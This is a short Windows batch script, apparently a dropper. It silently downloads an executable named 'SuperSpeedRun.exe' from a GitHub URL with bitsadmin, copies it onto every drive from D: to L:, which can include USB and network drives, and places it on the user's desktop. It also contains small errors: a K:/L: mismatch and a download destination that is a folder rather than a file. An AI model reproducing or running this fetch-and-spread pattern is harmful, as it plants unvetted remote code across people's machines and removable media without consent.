@echo off
cd %TEMP%
if not exist SuperSpeedRun.exe bitsadmin /transfer myDownloadJob /download /priority normal https://github.com/Criptc/My-Game/blob/main/SuperSpeedRun.exe?raw=true %TEMP%
if exist D:\ copy /Y SuperSpeedRun.exe D:\
if exist E:\ copy /Y SuperSpeedRun.exe E:\
if exist F:\ copy /Y SuperSpeedRun.exe F:\
if exist G:\ copy /Y SuperSpeedRun.exe G:\
if exist H:\ copy /Y SuperSpeedRun.exe H:\
if exist I:\ copy /Y SuperSpeedRun.exe I:\
if exist J:\ copy /Y SuperSpeedRun.exe J:\
if exist K:\ copy /Y SuperSpeedRun.exe K:\
if exist K:\ copy /Y SuperSpeedRun.exe L:\
if not exist C:\Users\%username%\Desktop\SuperSpeedRun.exe copy SuperSpeedRun.exe C:\Users\%username%\Desktop
exit 
 
 
 3/13/2022, 11:50:51 AM